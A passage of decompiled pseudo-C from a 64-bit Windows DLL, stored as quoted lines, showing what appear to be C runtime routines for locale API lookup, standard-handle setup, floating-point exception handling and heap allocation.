    "    return ((__int64 (__fastcall *)(__int64, _QWORD))v4)(a1, a2);",
    "  else",
    "    return sub_18002DF78(a1);",
    "}",
    "",
    "",
    "bool sub_180023B1C()",
    "{",
    "  return sub_180023464(1u, \"CompareStringEx\", (unsigned int *)&unk_18003DB40, (unsigned int *)\"CompareStringEx\") != 0;",
    "}",
    "",
    "",
    "FARPROC sub_180023B4C()",
    "{",
    "  sub_180023464(0, \"AreFileApisANSI\", &dword_18003DB28, &dword_18003DB2C);",
    "  sub_180023464(1u, \"CompareStringEx\", (unsigned int *)&unk_18003DB40, (unsigned int *)\"CompareStringEx\");",
    "  sub_180023464(2u, \"EnumSystemLocalesEx\", (unsigned int *)&unk_18003DB58, (unsigned int *)\"EnumSystemLocalesEx\");",
    "  sub_180023464(4u, \"GetDateFormatEx\", (unsigned int *)&unk_18003DB78, (unsigned int *)\"GetDateFormatEx\");",
    "  sub_180023464(8u, \"GetLocaleInfoEx\", (unsigned int *)&unk_18003DB90, (unsigned int *)\"GetLocaleInfoEx\");",
    "  sub_180023464(0xBu, \"GetTimeFormatEx\", (unsigned int *)&unk_18003DBA8, (unsigned int *)\"GetTimeFormatEx\");",
    "  sub_180023464(",
    "    0xCu,",
    "    \"GetUserDefaultLocaleName\",",
    "    (unsigned int *)&unk_18003DBC0,",
    "    (unsigned int *)\"GetUserDefaultLocaleName\");",
    "  sub_180023464(0x10u, \"IsValidLocaleName\", (unsigned int *)&unk_18003DBF0, (unsigned int *)\"IsValidLocaleName\");",
    "  sub_180023464(0x11u, \"LCMapStringEx\", (unsigned int *)&unk_18003DC10, (unsigned int *)\"LCMapStringEx\");",
    "  sub_180023464(0x12u, \"LCIDToLocaleName\", (unsigned int *)&unk_18003DC28, (unsigned int *)\"LCIDToLocaleName\");",
    "  return sub_180023464(0x13u, \"LocaleNameToLCID\", (unsigned int *)&unk_18003DC48, (unsigned int *)\"LocaleNameToLCID\");",
    "}",
    "",
    "",
    "char sub_180023CA8()",
    "{",
    "  memset64(qword_18004D770, _security_cookie, 0x1Fu);",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_180023CCC(char a1)",
    "{",
    "  __int64 *v1; // rbx",
    "  HMODULE v2; // rcx",
    "",
    "  if ( !a1 )",
    "  {",
    "    v1 = qword_18004D6C0;",
    "    do",
    "    {",
    "      v2 = (HMODULE)*v1;",
    "      if ( *v1 )",
    "      {",
    "        if ( v2 != (HMODULE)-1LL )",
    "          FreeLibrary(v2);",
    "        *v1 = 0;",
    "      }",
    "      ++v1;",
    "    }",
    "    while ( v1 != (__int64 *)&unk_18004D768 );",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 sub_180023D10()",
    "{",
    "  int i; // ebx",
    "  __int64 v1; // rcx",
    "  unsigned int v3; // [rsp+20h] [rbp-18h]",
    "",
    "  v3 = 0;",
    "  sub_1800209E8(8);",
    "  for ( i = 3; i != dword_18004D2D0; ++i )",
    "  {",
    "    v1 = *(_QWORD *)(*(_QWORD *)&qword_18004D2D8.ControlWord + 8LL * i);",
    "    if ( v1 )",
    "    {",
    "      if ( (*(_DWORD *)(v1 + 20) & 0x2000) != 0",
    "        && (unsigned int)sub_180020498(*(_QWORD *)(*(_QWORD *)&qword_18004D2D8.ControlWord + 8LL * i)) != -1 )",
    "      {",
    "        ++v3;",
    "      }",
    "      DeleteCriticalSection((LPCRITICAL_SECTION)(*(_QWORD *)(*(_QWORD *)&qword_18004D2D8.ControlWord + 8LL * i) + 48LL));",
    "      sub_180023374(*(XSAVE_FORMAT **)(*(_QWORD *)&qword_18004D2D8.ControlWord + 8LL * i));",
    "      *(_QWORD *)(*(_QWORD *)&qword_18004D2D8.ControlWord + 8LL * i) = 0;",
    "    }",
    "  }",
    "  sub_180020A3C(8);",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180023DC4(__int64 a1)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = *(_DWORD *)(a1 + 20) >> 13;",
    "  if ( (*(_DWORD *)(a1 + 20) & 0x2000) != 0 )",
    "  {",
    "    result = *(_DWORD *)(a1 + 20) >> 6;",
    "    if ( (*(_DWORD *)(a1 + 20) & 0x40) != 0 )",
    "    {",
    "      sub_180023374(*(XSAVE_FORMAT **)(a1 + 8));",
    "      _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFEBF);",
    "      result = 0;",
    "      *(_QWORD *)(a1 + 8) = 0;",
    "      *(_QWORD *)a1 = 0;",
    "      *(_DWORD *)(a1 + 16) = 0;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void sub_180023E08()",
    "{",
    "  LPBYTE v0; // rsi",
    "  __int64 v1; // rdi",
    "  HANDLE *v2; // rbx",
    "  __int64 v3; // rbp",
    "  __int64 v4; // rcx",
    "  __int64 v5; // rdx",
    "  struct _STARTUPINFOW v6; // [rsp+20h] [rbp-78h] BYREF",
    "",
    "  GetStartupInfoW(&v6);",
    "  if ( v6.cbReserved2 && v6.lpReserved2 )",
    "  {",
    "    v0 = v6.lpReserved2 + 4;",
    "    v1 = 0x2000;",
    "    v2 = (HANDLE *)&v6.lpReserved2[*(_DWORD *)v6.lpReserved2 + 4];",
    "    if ( *(int *)v6.lpReserved2 < 0x2000 )",
    "      v1 = *(unsigned int *)v6.lpReserved2;",
    "    sub_18002E114((unsigned int)v1);",
    "    if ( (int)v1 > dword_18004DC70 )",
    "      v1 = (unsigned int)dword_18004DC70;",
    "    if ( (_DWORD)v1 )",
    "    {",
    "      v3 = 0;",
    "      do",
    "      {",
    "        if ( *v2 != (HANDLE)-1LL && *v2 != (HANDLE)-2LL && (*v0 & 1) != 0 && ((*v0 & 8) != 0 || GetFileType(*v2)) )",
    "        {",
    "          v4 = qword_18004D870[v3 >> 6];",
    "          v5 = 9 * (v3 & 0x3F);",
    "          *(_QWORD *)(v4 + 8 * v5 + 40) = *v2;",
    "          *(_BYTE *)(v4 + 8 * v5 + 56) = *v0;",
    "        }",
    "        ++v3;",
    "        ++v0;",
    "        ++v2;",
    "        --v1;",
    "      }",
    "      while ( v1 );",
    "    }",
    "  }",
    "}",
    "",
    "",
    "__int64 sub_180023EF8()",
    "{",
    "  int v0; // esi",
    "  __int64 v1; // r14",
    "  __int64 v2; // rcx",
    "  __int64 v3; // rbx",
    "  __int64 v4; // rdi",
    "  __int64 v5; // rax",
    "  __int64 result; // rax",
    "  bool v7; // cf",
    "  DWORD v8; // ecx",
    "  HANDLE StdHandle; // rax",
    "  HANDLE v10; // rbp",
    "",
    "  v0 = 0;",
    "  v1 = 0;",
    "  do",
    "  {",
    "    v2 = v0 & 0x3F;",
    "    v3 = 9 * v2;",
    "    v4 = qword_18004D870[(__int64)v0 >> 6];",
    "    v5 = *(_QWORD *)(v4 + 72 * v2 + 40);",
    "    v7 = v5 == -2;",
    "    result = v5 + 2;",
    "    if ( v7 || result == 1 )",
    "    {",
    "      *(_BYTE *)(v4 + 72 * v2 + 56) = -127;",
    "      if ( v0 )",
    "      {",
    "        if ( v0 == 1 )",
    "          v8 = -11;",
    "        else",
    "          v8 = -12;",
    "      }",
    "      else",
    "      {",
    "        v8 = -10;",
    "      }",
    "      StdHandle = GetStdHandle(v8);",
    "      v10 = StdHandle;",
    "      if ( (unsigned __int64)StdHandle + 1 > 1 && (LODWORD(result) = GetFileType(StdHandle), (_DWORD)result) )",
    "      {",
    "        result = (unsigned __int8)result;",
    "        *(_QWORD *)(v4 + 8 * v3 + 40) = v10;",
    "        if ( (unsigned __int8)result == 2 )",
    "        {",
    "          *(_BYTE *)(v4 + 8 * v3 + 56) |= 0x40u;",
    "        }",
    "        else if ( (unsigned __int8)result == 3 )",
    "        {",
    "          *(_BYTE *)(v4 + 8 * v3 + 56) |= 8u;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        *(_BYTE *)(v4 + 8 * v3 + 56) |= 0x40u;",
    "        *(_QWORD *)(v4 + 8 * v3 + 40) = -2;",
    "        result = *(_QWORD *)&qword_18004D2D8.ControlWord;",
    "        if ( *(_QWORD *)&qword_18004D2D8.ControlWord )",
    "        {",
    "          result = *(_QWORD *)(v1 + *(_QWORD *)&qword_18004D2D8.ControlWord);",
    "          *(_DWORD *)(result + 24) = -2;",
    "        }",
    "      }",
    "    }",
    "    else",
    "    {",
    "      *(_BYTE *)(v4 + 72 * v2 + 56) |= 0x80u;",
    "    }",
    "    ++v0;",
    "    v1 += 8;",
    "  }",
    "  while ( v0 != 3 );",
    "  return result;",
    "}",
    "",
    "",
    "char sub_180024000()",
    "{",
    "  char v0; // bl",
    "",
    "  sub_1800209E8(7);",
    "  v0 = 0;",
    "  if ( !(unsigned int)sub_18002E114(0) )",
    "  {",
    "    sub_180023E08();",
    "    sub_180023EF8();",
    "    v0 = 1;",
    "  }",
    "  sub_180020A3C(7);",
    "  return v0;",
    "}",
    "",
    "",
    "char sub_18002403C()",
    "{",
    "  unsigned __int64 i; // rbx",
    "  struct _RTL_CRITICAL_SECTION *v1; // rcx",
    "",
    "  for ( i = 0; i < 128; ++i )",
    "  {",
    "    v1 = (struct _RTL_CRITICAL_SECTION *)qword_18004D870[i];",
    "    if ( v1 )",
    "    {",
    "      sub_18002E0C4(v1);",
    "      qword_18004D870[i] = 0;",
    "    }",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "double __fastcall sub_1800240C0(__int64 a1, int a2, double a3, double a4, __int64 a5)",
    "{",
    "  __int64 v5; // rdi",
    "  unsigned int v7; // ebx",
    "  unsigned int v8; // ebx",
    "  int v9; // r8d",
    "  int v10; // r9d",
    "  double result; // xmm0_8",
    "  double v12; // [rsp+48h] [rbp-61h] BYREF",
    "  double v13; // [rsp+50h] [rbp-59h] BYREF",
    "  char v14; // [rsp+58h] [rbp-51h] BYREF",
    "  int v15; // [rsp+98h] [rbp-11h]",
    "",
    "  v5 = a5;",
    "  v13 = a3;",
    "  v12 = a4;",
    "  v7 = a1;",
    "  if ( !(unsigned int)sub_1800241B4(a1, &v12, a5) )",
    "  {",
    "    v15 &= ~1u;",
    "    sub_1800244D0((unsigned int)&v14, (unsigned int)&a5, v7, a2, (__int64)&v13, (__int64)&v12, 0);",
    "    v5 = a5;",
    "  }",
    "  v8 = errcode(v7);",
    "  if ( (unsigned __int8)sub_18002DE24() && v8 )",
    "  {",
    "    result = v12;",
    "    sub_180024808(v8, a2, v9, v10, *(__int64 *)&v12, v5);",
    "  }",
    "  else",
    "  {",
    "    sub_1800247D8(v8);",
    "    ctrlfp(v5, 65472);",
    "    return v12;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800241B4(unsigned int a1, double *a2, __int16 a3)",
    "{",
    "  unsigned int v3; // edi",
    "  int v4; // ebx",
    "  char v7; // r12",
    "  __int64 v8; // rax",
    "  double v9; // xmm0_8",
    "  int v10; // r14d",
    "  double v11; // xmm0_8",
    "  int v12; // edx",
    "  double v13; // xmm6_8",
    "  int v14; // r11d",
    "  char v15; // r9",
    "  char v16; // cl",
    "  unsigned int v17; // eax",
    "  __int64 v18; // r10",
    "  unsigned int v19; // edx",
    "  char v20; // r8",
    "  bool v21; // r15",
    "  int v22; // eax",
    "  bool v23; // zf",
    "  int v25; // [rsp+20h] [rbp-68h] BYREF",
    "  double v26; // [rsp+28h] [rbp-60h]",
    "  char v27; // [rsp+90h] [rbp+8h]",
    "  char v28; // [rsp+A8h] [rbp+20h]",
    "",
    "  v3 = 0;",
    "  v4 = a1 & 0x1F;",
    "  v7 = a1;",
    "  if ( (a1 & 8) != 0 && (a3 & 0x80u) != 0 )",
    "  {",
    "    set_statfp(1);",
    "    v4 &= ~8u;",
    "    goto LABEL_58;",
    "  }",
    "  if ( (a1 & 4) != 0 && (a3 & 0x200) != 0 )",
    "  {",
    "    set_statfp(4);",
    "    v4 &= ~4u;",
    "    goto LABEL_58;",
    "  }",
    "  if ( (a1 & 1) != 0 && (a3 & 0x400) != 0 )",
    "  {",
    "    set_statfp(8);",
    "    v8 = a3 & 0x6000;",
    "    if ( (a3 & 0x6000) != 0 )",
    "    {",
    "      if ( v8 != 0x2000 )",
    "      {",
    "        if ( v8 != 0x4000 )",
    "        {",
    "          if ( v8 != 24576 )",
    "          {",
    "LABEL_24:",
    "            v4 &= ~1u;",
    "            goto LABEL_58;",
    "          }",
    "          v9 = 1.797693134862316e308;",
    "          if ( *a2 <= 0.0 )",
    "            goto LABEL_22;",
    "LABEL_23:",
    "          *a2 = v9;",
    "          goto LABEL_24;",
    "        }",
    "        if ( *a2 <= 0.0 )",
    "        {",
    "          v9 = 1.797693134862316e308;",
    "LABEL_22:",
    "          v9 = -v9;",
    "          goto LABEL_23;",
    "        }",
    "LABEL_20:",
    "        v9 = INFINITY;",
    "        goto LABEL_23;",
    "      }",
    "      if ( *a2 > 0.0 )",
    "      {",
    "        v9 = 1.797693134862316e308;",
    "        goto LABEL_23;",
    "      }",
    "    }",
    "    else if ( *a2 > 0.0 )",
    "    {",
    "      goto LABEL_20;",
    "    }",
    "    v9 = INFINITY;",
    "    goto LABEL_22;",
    "  }",
    "  if ( (a1 & 2) != 0 && (a3 & 0x800) != 0 )",
    "  {",
    "    v10 = (a1 >> 4) & 1;",
    "    if ( *a2 == 0.0 )",
    "      goto LABEL_56;",
    "    v11 = sub_1800248D8(4, &v25);",
    "    v12 = v25 - 1536;",
    "    v26 = v11;",
    "    if ( v25 - 1536 < -1074 )",
    "    {",
    "      v10 = 1;",
    "      v13 = v11 * 0.0;",
    "      goto LABEL_55;",
    "    }",
    "    v14 = 0;",
    "    v15 = 0;",
    "    v16 = 0;",
    "    v28 = 0;",
    "    v27 = 0;",
    "    HIWORD(v26) = BYTE6(v26) & 0xF | 0x10;",
    "    if ( v12 < -1021 )",
    "    {",
    "      v17 = LODWORD(v26);",
    "      v18 = (unsigned int)(-1021 - v12);",
    "      v19 = HIDWORD(v26);",
    "      do",
    "      {",
    "        v20 = v17 & 1;",
    "        if ( (v17 & 1) != 0 && !v10 )",
    "          v10 = 1;",
    "        v23 = v16 == 0;",
    "        v16 = v17 & 1;",
    "        if ( !v23 )",
    "          v15 = 1;",
    "        v17 >>= 1;",
    "        LODWORD(v26) = v17;",
    "        if ( (v19 & 1) != 0 )",
    "        {",
    "          v17 |= 0x80000000;",
    "          LODWORD(v26) = v17;",
    "        }",
    "        v19 >>= 1;",
    "        --v18;",
    "      }",
    "      while ( v18 );",
    "      HIDWORD(v26) = v19;",
    "      v28 = v15;",
    "      v27 = v20;",
    "    }",
    "    v13 = v26;",
    "    LOBYTE(v14) = v11 < 0.0;",
    "    if ( v14 )",
    "    {",
    "      v13 = -v26;",
    "      v26 = -v26;",
    "    }",
    "    v21 = v11 < 0.0;",
    "    if ( !v16 && !v15 )",
    "    {",
    "LABEL_55:",
    "      *a2 = v13;",
    "      if ( !v10 )",
    "      {",
    "LABEL_57:",
    "        v4 &= ~2u;",
    "        goto LABEL_58;",
    "      }",
    "LABEL_56:",
    "      set_statfp(16);",
    "      goto LABEL_57;",
    "    }",
    "    v22 = sub_180028050();",
    "    if ( v22 )",
    "    {",
    "      if ( v22 != 256 )",
    "      {",
    "        if ( v22 != 512 )",
    "          goto LABEL_55;",
    "        v21 = v11 >= 0.0;",
    "      }",
    "      v23 = !v21;",
    "    }",
    "    else",
    "    {",
    "      if ( !v27 )",
    "        goto LABEL_55;",
    "      if ( v28 )",
    "      {",
    "LABEL_54:",
    "        ++*(_QWORD *)&v26;",
    "        v13 = v26;",
    "        goto LABEL_55;",
    "      }",
    "      v23 = (LOBYTE(v26) & 1) == 0;",
    "    }",
    "    if ( v23 )",
    "      goto LABEL_55;",
    "    goto LABEL_54;",
    "  }",
    "LABEL_58:",
    "  if ( (v7 & 0x10) != 0 && (a3 & 0x1000) != 0 )",
    "  {",
    "    set_statfp(32);",
    "    v4 &= ~0x10u;",
    "  }",
    "  LOBYTE(v3) = v4 == 0;",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 __fastcall raise_exc(int a1, int a2, int a3, int a4, __int64 a5, __int64 a6)",
    "{",
    "  return sub_1800244D0(a1, a2, a3, a4, a5, a6, 0);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800244D0(ULONG_PTR a1, _QWORD *a2, char a3, __int16 a4, _DWORD *a5, _DWORD *a6, int a7)",
    "{",
    "  DWORD v9; // edi",
    "  char v10; // al",
    "  __int64 v11; // rax",
    "  _DWORD *v12; // rsi",
    "  ULONG_PTR v13; // rcx",
    "  __int64 result; // rax",
    "  ULONG_PTR Arguments; // [rsp+30h] [rbp+10h] BYREF",
    "",
    "  Arguments = a1;",
    "  v9 = -1073741811;",
    "  *(_DWORD *)(a1 + 4) = 0;",
    "  *(_DWORD *)(Arguments + 8) = 0;",
    "  *(_DWORD *)(Arguments + 12) = 0;",
    "  if ( (a3 & 0x10) != 0 )",
    "  {",
    "    v9 = -1073741681;",
    "    *(_DWORD *)(Arguments + 4) |= 1u;",
    "  }",
    "  if ( (a3 & 2) != 0 )",
    "  {",
    "    v9 = -1073741677;",
    "    *(_DWORD *)(Arguments + 4) |= 2u;",
    "  }",
    "  if ( (a3 & 1) != 0 )",
    "  {",
    "    v9 = -1073741679;",
    "    *(_DWORD *)(Arguments + 4) |= 4u;",
    "  }",
    "  if ( (a3 & 4) != 0 )",
    "  {",
    "    v9 = -1073741682;",
    "    *(_DWORD *)(Arguments + 4) |= 8u;",
    "  }",
    "  if ( (a3 & 8) != 0 )",
    "  {",
    "    v9 = -1073741680;",
    "    *(_DWORD *)(Arguments + 4) |= 0x10u;",
    "  }",
    "  *(_DWORD *)(Arguments + 8) ^= (*(_DWORD *)(Arguments + 8) ^ ~(16 * (*a2 >> 7))) & 0x10;",
    "  *(_DWORD *)(Arguments + 8) ^= (*(_DWORD *)(Arguments + 8) ^ ~(8 * (*a2 >> 9))) & 8;",
    "  *(_DWORD *)(Arguments + 8) ^= (*(_DWORD *)(Arguments + 8) ^ ~(4 * (*a2 >> 10))) & 4;",
    "  *(_DWORD *)(Arguments + 8) ^= (*(_DWORD *)(Arguments + 8) ^ ~(2 * (*a2 >> 11))) & 2;",
    "  *(_DWORD *)(Arguments + 8) ^= (*(_DWORD *)(Arguments + 8) ^ ~(*(_DWORD *)a2 >> 12)) & 1;",
    "  v10 = statfp();",
    "  if ( (v10 & 1) != 0 )",
    "    *(_DWORD *)(Arguments + 12) |= 0x10u;",
    "  if ( (v10 & 4) != 0 )",
    "    *(_DWORD *)(Arguments + 12) |= 8u;",
    "  if ( (v10 & 8) != 0 )",
    "    *(_DWORD *)(Arguments + 12) |= 4u;",
    "  if ( (v10 & 0x10) != 0 )",
    "    *(_DWORD *)(Arguments + 12) |= 2u;",
    "  if ( (v10 & 0x20) != 0 )",
    "    *(_DWORD *)(Arguments + 12) |= 1u;",
    "  v11 = *(_DWORD *)a2 & 0x6000LL;",
    "  if ( v11 )",
    "  {",
    "    switch ( v11 )",
    "    {",
    "      case 8192LL:",
    "        *(_DWORD *)Arguments &= ~2u;",
    "        *(_DWORD *)Arguments |= 1u;",
    "        break;",
    "      case 16384LL:",
    "        *(_DWORD *)Arguments &= ~1u;",
    "        *(_DWORD *)Arguments |= 2u;",
    "        break;",
    "      case 24576LL:",
    "        *(_DWORD *)Arguments |= 3u;",
    "        break;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)Arguments &= 0xFFFFFFFC;",
    "  }",
    "  *(_DWORD *)Arguments &= 0xFFFE001F;",
    "  *(_DWORD *)Arguments |= 32 * (a4 & 0xFFF);",
    "  v12 = a6;",
    "  *(_DWORD *)(Arguments + 32) |= 1u;",
    "  if ( a7 )",
    "  {",
    "    *(_DWORD *)(Arguments + 32) &= 0xFFFFFFE1;",
    "    *(_DWORD *)(Arguments + 16) = *a5;",
    "    *(_DWORD *)(Arguments + 96) |= 1u;",
    "    *(_DWORD *)(Arguments + 96) &= 0xFFFFFFE1;",
    "    *(_DWORD *)(Arguments + 80) = *v12;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(Arguments + 32) = *(_DWORD *)(Arguments + 32) & 0xFFFFFFE1 | 2;",
    "    *(_QWORD *)(Arguments + 16) = *(_QWORD *)a5;",
    "    *(_DWORD *)(Arguments + 96) |= 1u;",
    "    *(_DWORD *)(Arguments + 96) = *(_DWORD *)(Arguments + 96) & 0xFFFFFFE1 | 2;",
    "    *(_QWORD *)(Arguments + 80) = *(_QWORD *)v12;",
    "  }",
    "  clrfp();",
    "  RaiseException(v9, 0, 1u, &Arguments);",
    "  v13 = Arguments;",
    "  if ( (*(_BYTE *)(Arguments + 8) & 0x10) != 0 )",
    "    *a2 &= ~0x80uLL;",
    "  if ( (*(_BYTE *)(v13 + 8) & 8) != 0 )",
    "    *a2 &= ~0x200uLL;",
    "  if ( (*(_BYTE *)(v13 + 8) & 4) != 0 )",
    "    *a2 &= ~0x400uLL;",
    "  if ( (*(_BYTE *)(v13 + 8) & 2) != 0 )",
    "    *a2 &= ~0x800uLL;",
    "  if ( (*(_BYTE *)(v13 + 8) & 1) != 0 )",
    "    *a2 &= ~0x1000uLL;",
    "  if ( (*(_DWORD *)v13 & 3) != 0 )",
    "  {",
    "    switch ( *(_DWORD *)v13 & 3 )",
    "    {",
    "      case 1:",
    "        *a2 &= ~0x4000uLL;",
    "        *a2 |= 0x2000uLL;",
    "        break;",
    "      case 2:",
    "        *a2 &= ~0x2000uLL;",
    "        *a2 |= 0x4000uLL;",
    "        break;",
    "      case 3:",
    "        *a2 |= 0x6000uLL;",
    "        break;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *a2 &= 0xFFFFFFFFFFFF9FFFuLL;",
    "  }",
    "  if ( a7 )",
    "  {",
    "    result = *(unsigned int *)(v13 + 80);",
    "    *v12 = result;",
    "  }",
    "  else",
    "  {",
    "    result = *(_QWORD *)(v13 + 80);",
    "    *(_QWORD *)v12 = result;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_1800247D8(int a1)",
    "{",
    "  int v1; // ecx",
    "",
    "  v1 = a1 - 1;",
    "  if ( v1 )",
    "  {",
    "    if ( (unsigned int)(v1 - 1) <= 1 )",
    "      *(_DWORD *)sub_18001A80C() = 34;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 33;",
    "  }",
    "}",
    "",
    "",
    "double __fastcall sub_180024808(int a1, int a2, double a3, double a4, double a5, __int64 a6)",
    "{",
    "  int v7; // r8d",
    "  _DWORD *v8; // rax",
    "  int v10; // [rsp+20h] [rbp-30h] BYREF",
    "  __int64 v11; // [rsp+28h] [rbp-28h]",
    "  double v12; // [rsp+30h] [rbp-20h]",
    "  double v13; // [rsp+38h] [rbp-18h]",
    "  double v14; // [rsp+40h] [rbp-10h]",
    "",
    "  v7 = 0;",
    "  v8 = &unk_18003DC90;",
    "  while ( *v8 != a2 )",
    "  {",
    "    ++v7;",
    "    v8 += 4;",
    "    if ( (__int64)v8 >= (__int64)&dword_18003DE60 )",
    "    {",
    "      v11 = 0;",
    "LABEL_5:",
    "      ctrlfp(a6, 65472);",
    "      sub_1800247D8(a1);",
    "      return a5;",
    "    }",
    "  }",
    "  v11 = *((_QWORD *)&unk_18003DC90 + 2 * v7 + 1);",
    "  if ( !v11 )",
    "    goto LABEL_5;",
    "  v12 = a3;",
    "  v13 = a4;",
    "  v14 = a5;",
    "  v10 = a1;",
    "  ctrlfp(a6, 65472);",
    "  if ( !(unsigned int)sub_18002DE4C(&v10) )",
    "    sub_1800247D8(a1);",
    "  return v14;",
    "}",
    "",
    "",
    "void __fastcall sub_1800248D8(double a1, int *a2)",
    "{",
    "  int v3; // ecx",
    "  int v4; // edx",
    "  int v5; // eax",
    "  char v6; // [rsp+Eh] [rbp+Eh]",
    "",
    "  if ( a1 == 0.0 )",
    "  {",
    "    v3 = 0;",
    "  }",
    "  else if ( (HIWORD(a1) & 0x7FF0) == 0 && ((v4 = LODWORD(a1), (HIDWORD(a1) & 0xFFFFF) != 0) || LODWORD(a1)) )",
    "  {",
    "    v3 = -1021;",
    "    if ( (BYTE6(a1) & 0x10) == 0 )",
    "    {",
    "      v5 = HIDWORD(a1);",
    "      do",
    "      {",
    "        v5 *= 2;",
    "        v6 = BYTE2(v5);",
    "        if ( v4 < 0 )",
    "        {",
    "          v5 |= 1u;",
    "          v6 = BYTE2(v5);",
    "        }",
    "        v4 *= 2;",
    "        --v3;",
    "      }",
    "      while ( (v6 & 0x10) == 0 );",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v3 = ((HIWORD(a1) >> 4) & 0x7FF) - 1022;",
    "  }",
    "  *a2 = v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180024A08(double a1)",
    "{",
    "  if ( HIDWORD(a1) == 2146435072 )",
    "  {",
    "    if ( !LODWORD(a1) )",
    "      return 1;",
    "  }",
    "  else if ( HIDWORD(a1) == -1048576 && !LODWORD(a1) )",
    "  {",
    "    return 2;",
    "  }",
    "  if ( (HIWORD(a1) & 0x7FF8) == 0x7FF8 )",
    "    return 3;",
    "  if ( (HIWORD(a1) & 0x7FF8) != 0x7FF0 )",
    "    return 0;",
    "  if ( (HIDWORD(a1) & 0x7FFFF) != 0 )",
    "    return 4;",
    "  return LODWORD(a1) != 0 ? 4 : 0;",
    "}",
    "",
    "",
    "__int64 clrfp()",
    "{",
    "  __int64 v0; // rbx",
    "",
    "  v0 = get_fpsr() & 0x3F;",
    "  fclrf();",
    "  return (unsigned int)v0;",
    "}",
    "",
    "",
    "__int64 __fastcall ctrlfp(int a1, int a2)",
    "{",
    "  unsigned int fpsr; // esi",
    "  __int64 v5; // rcx",
    "",
    "  fpsr = get_fpsr();",
    "  v5 = a2 & a1 | fpsr & (~(_WORD)a2 | 0xFFFF807F);",
    "  if ( byte_18004B328 && (((unsigned __int8)(a2 & a1) | fpsr & ((unsigned __int8)~(_BYTE)a2 | 0x7F)) & 0x40) != 0 )",
    "    set_fpsr(v5);",
    "  else",
    "    set_fpsr((unsigned int)v5 & 0xFFFFFFBF);",
    "  return fpsr;",
    "}",
    "",
    "",
    "__int64 __fastcall set_statfp(char a1)",
    "{",
    "  unsigned int fpsr; // eax",
    "",
    "  fpsr = get_fpsr();",
    "  return set_fpsr(a1 & 0x3F | fpsr);",
    "}",
    "",
    "",
    "__int64 statfp()",
    "{",
    "  return get_fpsr() & 0x3F;",
    "}",
    "",
    "",
    "LPVOID __fastcall sub_180024B50(unsigned __int64 a1)",
    "{",
    "  SIZE_T v1; // rbx",
    "  LPVOID result; // rax",
    "",
    "  v1 = a1;",
    "  if ( a1 > 0xFFFFFFFFFFFFFFE0uLL )",
    "  {",
    "LABEL_9:",
    "    *(_DWORD *)sub_18001A80C() = 12;",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    if ( !a1 )",
    "      v1 = 1;",
    "    while ( 1 )",
    "    {",
    "      result = HeapAlloc(hHeap, 0, v1);",
    "      if ( result )",
    "        break;",
    "      if ( !(unsigned int)sub_18002DE88() || !(unsigned int)sub_180021FE8(v1) )",
    "        goto LABEL_9;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180024BB0(__int64 a1, __int64 *a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = qword_18004DCA0;",
    "  if ( *a2 != qword_18004DCA0 )",
    "  {",
    "    result = *(unsigned int *)(a1 + 936);",
    "    if ( ((unsigned int)result & dword_18004B5B0) == 0 )",
    "    {",
    "      result = sub_18002E8D4();",
    "      *a2 = result;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180024BE4(__int64 a1, __int64 *a2, __int64 a3)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = qword_18004DCA0[a3];",
    "  if ( *a2 != result )",
    "  {",
    "    result = *(unsigned int *)(a1 + 936);",
    "    if ( ((unsigned int)result & dword_18004B5B0) == 0 )",
    "    {",
    "      result = sub_18002E8D4();",
    "      *a2 = result;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180024C1C(__int64 a1, __int64 *a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = *(_QWORD *)&qword_18004DDC0.ControlWord;",
    "  if ( *a2 != *(_QWORD *)&qword_18004DDC0.ControlWord )",
    "  {",
    "    result = *(unsigned int *)(a1 + 936);",
    "    if ( ((unsigned int)result & dword_18004B5B0) == 0 )",
    "    {",
    "      result = sub_18002D7EC();",
    "      *a2 = result;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180024C50(__int64 a1, __int64 *a2, __int64 a3)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = *((_QWORD *)&qword_18004DDC0.ControlWord + a3);",
    "  if ( *a2 != result )",
    "  {",
    "    result = *(unsigned int *)(a1 + 936);",
    "    if ( ((unsigned int)result & dword_18004B5B0) == 0 )",
    "    {",
    "      result = sub_18002D7EC();",
    "      *a2 = result;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180024C88(",
    "        __int64 *a1,",
    "        __int64 a2,",
    "        unsigned __int64 a3,",
    "        int a4,",
    "        __int64 a5,",
    "        int a6,",
    "        char a7,",
    "        int a8,",
    "        unsigned int a9,",
    "        __int64 a10)",
    "{",
    "  int v10; // edi",
    "  _BYTE *v11; // rbx",
    "  __int64 result; // rax",
    "  _BYTE *v14; // rax",
    "  char *v15; // r12",
    "  __int64 v16; // r15",
    "  _BYTE *v17; // rsi",
    "  char v18; // al",
    "  unsigned __int64 v19; // r10",
    "  unsigned __int16 v20; // ax",
    "  char *i; // rcx",
    "  char v22; // dl",
